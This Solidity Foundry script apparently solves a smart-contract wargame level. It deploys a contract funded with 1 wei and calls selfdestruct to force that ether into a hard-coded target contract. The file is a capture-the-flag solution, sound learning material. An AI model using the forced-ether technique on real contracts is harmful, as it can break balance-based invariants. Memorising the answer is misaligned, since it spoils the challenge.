// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract DeadPool {
    address owner;
    constructor() payable{
        owner = msg.sender;
    }

    function destructContract(address payable _to) public {
        require(msg.sender == owner, "Only the owner can destroy the contract");
        selfdestruct(_to);    
    }
}


contract Level07Solution is Script {
    function run() external {
        vm.startBroadcast();
        DeadPool dp = new DeadPool{value : 1 wei}();
        dp.destructContract(payable(0x1c4Ec8142cE2aDd3e3BC44287Db1a9444603f020));
        vm.stopBroadcast();
    }
}